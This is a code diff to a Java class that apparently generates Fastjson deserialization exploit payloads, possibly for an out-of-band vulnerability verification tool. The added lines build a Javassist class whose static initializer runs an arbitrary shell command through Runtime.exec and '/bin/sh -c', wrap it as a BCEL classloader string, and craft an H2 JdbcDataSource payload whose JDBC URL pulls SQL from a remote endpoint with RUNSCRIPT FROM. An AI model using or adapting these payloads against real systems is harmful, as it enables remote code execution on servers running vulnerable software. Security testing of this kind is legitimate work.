@@ -1,5 +1,9 @@
 package com.oobx.chains;
 
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtNewConstructor;
+import javassist.bytecode.ClassFile;
 import org.springframework.stereotype.Component;
 
 import java.util.Base64;
@@ -66,12 +70,30 @@ public class FastjsonChainHandler implements ChainHandler {
      * Class bytes come from CustomBytecodeHandler (Javassist) — no custom ASM.
      */
     private String bcelDriverClassName(String cmd, Map<String, Object> params) throws Exception {
-        // Delegate to CustomBytecodeHandler which uses Javassist
-        byte[] classBytes = bytecodeHandler.generate("custom_bytecode", params).bytes();
-        // BCEL encoding: standard base64 with char substitutions
+        // Generate a class with exec in static initializer — BCEL classloader runs
+        // Class.forName(name, true, bcelClassLoader) which triggers static init.
+        // CustomBytecodeHandler puts exec in doFilter() which never gets called.
+        byte[] classBytes = generateBcelExecClass(cmd);
+        // BCEL encoding: standard base64 with + → $ and / → !
         String b64 = Base64.getEncoder().encodeToString(classBytes)
                           .replace("+", "$").replace("/", "!");
         return "$$BCEL$$" + b64;
+    }
+
+    /** Generate a class whose static initializer calls Runtime.exec(cmd). */
+    private byte[] generateBcelExecClass(String cmd) throws Exception {
+        javassist.ClassPool cp = javassist.ClassPool.getDefault();
+        String cls = "com.oobx.bcel.Exec" + Long.toHexString(System.nanoTime());
+        javassist.CtClass cc = cp.makeClass(cls);
+        String safe = cmd.replace("\\", "\\\\").replace("\"", "\\\"");
+        cc.makeClassInitializer().setBody(
+            "{ try { Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"" + safe + "\"}); }" +
+            " catch (Exception e) {} }");
+        cc.getClassFile().setMajorVersion(javassist.bytecode.ClassFile.JAVA_8);
+        cc.getClassFile().setMinorVersion(0);
+        byte[] b = cc.toBytecode();
+        cc.detach();
+        return b;
     }
 
     private String bcelJson(String driverClassName) {
@@ -100,9 +122,12 @@ public class FastjsonChainHandler implements ChainHandler {
         if (idx >= 0) tokShort = cmd.substring(idx + "/tmp/oobx_".length());
 
         String dbId = Long.toHexString(System.nanoTime()).substring(0, 8);
-        // FILE_WRITE creates the proof file — no semicolons in SQL body
+        // Use RUNSCRIPT FROM sidecar: H2 fetches SQL from the sidecar endpoint as a file.
+        // File-based execution avoids the JDBC URL parser semicolon truncation issue.
+        // The sidecar's H2ScriptController serves CREATE ALIAS + CALL with the token baked in.
+        String scriptUrl = "http://host.docker.internal:8711/h2-script?tok=" + tokShort;
         String jdbcUrl = "jdbc:h2:mem:oobx" + dbId
-            + ";INIT=SELECT FILE_WRITE('rce','/tmp/oobx_" + tokShort + "')";
+            + ";RUNSCRIPT FROM '" + scriptUrl + "'";
         return String.format(
             "{\"@type\":\"org.h2.jdbcx.JdbcDataSource\","
             + "\"URL\":\"%s\","
